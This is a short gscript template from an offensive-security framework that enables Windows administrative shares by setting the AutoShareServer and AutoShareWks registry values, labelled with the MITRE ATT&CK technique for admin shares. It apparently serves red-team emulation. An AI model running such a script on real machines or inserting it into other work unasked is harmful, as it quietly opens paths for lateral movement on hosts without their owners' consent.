// Example gscript template
// Title: Enable Admin Shares
// Author: ahhh
// Purpose: This will Enable Admin Shares
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1077

//priority:97
//timeout:150

//go_import:github.com/gen0cide/gscript/x/windows as windows

function Deploy() {
    console.log("Starting Enable Admin Shares");

    var value = 1
    // enable admin shares
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters", "AutoShareServer", value);

    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters", "AutoShareWks", value);

    console.log("Done Enable Admin Shares");
    return true;
  }
  